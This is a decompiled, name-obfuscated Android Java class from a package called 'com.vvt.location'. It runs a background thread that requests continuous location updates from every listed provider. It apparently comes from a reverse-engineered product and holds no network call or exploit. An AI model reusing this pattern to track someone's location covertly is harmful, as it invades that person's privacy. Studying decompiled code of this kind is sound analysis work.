package com.vvt.location;

import android.location.LocationManager;
import android.os.Looper;
import java.util.Iterator;
import java.util.List;

class g
  extends Thread
{
  private d b;
  private Looper c;
  private long d;
  
  public g(a parama, d paramd, long paramLong)
  {
    this.b = paramd;
    this.d = paramLong;
  }
  
  public void a()
  {
    boolean bool = a.c();
    if (bool) {}
    Object localObject = this.a;
    d locald = this.b;
    a.a((a)localObject, locald);
    localObject = this.c;
    if (localObject != null)
    {
      bool = a.c();
      if (bool) {}
      localObject = this.c;
      ((Looper)localObject).quit();
    }
  }
  
  public void run()
  {
    boolean bool = a.c();
    if (bool) {}
    bool = a.c();
    if (bool) {}
    Looper.prepare();
    bool = a.c();
    if (bool) {}
    Object localObject = a.h(this.a);
    Iterator localIterator = ((List)localObject).iterator();
    for (;;)
    {
      bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      String str = (String)localIterator.next();
      localObject = a.i(this.a);
      long l = this.d;
      d locald = this.b;
      ((LocationManager)localObject).requestLocationUpdates(str, l, 0.0F, locald);
    }
    localObject = Looper.myLooper();
    this.c = ((Looper)localObject);
    bool = a.c();
    if (bool) {}
    Looper.loop();
    bool = a.c();
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/location/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */